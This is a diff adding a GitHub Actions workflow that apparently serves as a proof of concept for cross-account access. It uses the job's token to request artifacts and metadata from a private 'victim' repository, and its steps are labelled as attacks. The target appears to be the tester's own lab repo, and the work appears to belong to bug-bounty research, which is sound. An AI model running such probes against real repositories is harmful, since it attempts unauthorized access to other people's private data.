@@ -1,0 +1,24 @@
+name: cross-repo-artifact-probe
+on: workflow_dispatch
+permissions: { contents: read, actions: read }
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: can THIS repo's token reach a PRIVATE repo in another account?
+        run: |
+          T="${{ github.token }}"
+          V=hackeroneadityandrew/org-private-lab
+          echo "--- CONTROL: own repo artifacts (must be 200) ---"
+          curl -s -o /dev/null -w "own repo            : HTTP %{http_code}\n" \
+            -H "Authorization: Bearer $T" https://api.github.com/repos/${{ github.repository }}/actions/artifacts
+          echo "--- ATTACK: private repo in a DIFFERENT account/org ---"
+          curl -s -o /tmp/a -w "victim artifacts    : HTTP %{http_code}\n" \
+            -H "Authorization: Bearer $T" https://api.github.com/repos/$V/actions/artifacts
+          echo "body: $(head -c 200 /tmp/a)"
+          echo "--- ATTACK: victim repo metadata ---"
+          curl -s -o /dev/null -w "victim repo meta    : HTTP %{http_code}\n" \
+            -H "Authorization: Bearer $T" https://api.github.com/repos/$V
+          echo "--- ATTACK: direct artifact download by id ---"
+          AID=$(curl -s -H "Authorization: Bearer $T" https://api.github.com/repos/$V/actions/artifacts | grep -oE '"id":[0-9]+' | head -1 | cut -d: -f2)
+          echo "artifact id seen: ${AID:-none}"
